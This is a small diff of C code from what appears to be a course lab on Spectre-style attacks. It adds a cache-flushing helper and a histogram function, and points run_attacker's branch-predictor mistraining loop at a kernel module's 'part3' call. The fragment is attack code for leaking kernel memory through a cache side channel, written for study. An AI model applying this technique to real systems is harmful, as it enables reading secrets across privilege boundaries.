@@ -28,6 +28,24 @@ static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t 
 
     write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
 }
+void clean_shared_memory_from_tlb(char *shared_memory) {
+    for (size_t i = 0; i < 256; i++)
+    {
+        clflush(shared_memory + (4096*i));
+    }
+}
+
+
+int max_idx(int *hist , int size) {
+    int max_id = 0;
+    for (int i = 0; i < size; i++) {
+        if (hist[i] > hist[max_id]) {
+            max_id = i;
+        }
+    }
+    return max_id;
+}
+
 
 /*
  * run_attacker
@@ -51,10 +69,10 @@ int run_attacker(int kernel_fd, char *shared_memory) {
             for (size_t i = 0; i < 64 ; i++) //fool BP -in part 2.4 we need to change max(i) //rand max i?
             { 
                 clean_shared_memory_from_tlb(shared_memory);
-                call_kernel_part2(kernel_fd, shared_memory, rand() % 2);
+                call_kernel_part3(kernel_fd, shared_memory, rand() % 2);
             }
             clean_shared_memory_from_tlb(shared_memory);
-            call_kernel_part2(kernel_fd, shared_memory, current_offset);
+            call_kernel_part3(kernel_fd, shared_memory, current_offset);
             int tmp;
         
             for (int i = 0; i < 256; i++) {
